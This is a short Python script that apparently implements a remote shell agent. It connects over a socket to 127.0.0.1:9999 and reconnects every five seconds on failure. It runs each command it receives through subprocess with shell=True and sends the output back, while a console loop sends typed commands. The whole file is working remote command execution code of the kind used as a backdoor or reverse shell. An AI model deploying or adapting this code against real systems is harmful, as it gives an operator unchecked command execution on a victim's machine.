import json
import locale
import logging
import socket
import struct
import subprocess
import threading
import time

logging.basicConfig(level=logging.DEBUG)


class Server:
    def __init__(self):
        self.socket = socket.socket()

    def connect(self):
        logging.info('Connecting')
        while not self.socket.connect_ex(('127.0.0.1', 9999)) == 0:
            time.sleep(5)

    def send(self, id, data):
        data = json.dumps({
            'id': id,
            'data': data
        }).encode('utf-8')
        size = struct.pack('i', len(data))
        self.socket.send(size + data)

    def recv(self):
        pack = self.socket.recv(4)
        if pack:
            size = struct.unpack('i', pack)[0]
            if size:
                data = self.socket.recv(size)
                if data:
                    data = json.loads(data)
                    logging.info(data)
                    return data['id'], data['data']


def wait():
    while True:
        try:
            id, data = server.recv()
            try:
                if data:
                    p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.DEVNULL)
                    result = str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
                    server.send(id, result)
            except Exception as e:
                server.send(id, e)
        except:
            logging.error('接收异常', exc_info=True)
            server.socket = socket.socket()
            server.connect()


server = Server()
server.connect()
threading.Thread(target=wait, daemon=True).start()
while 1:
    data = input('> ')
    if data.strip():
        server.send(1, data)
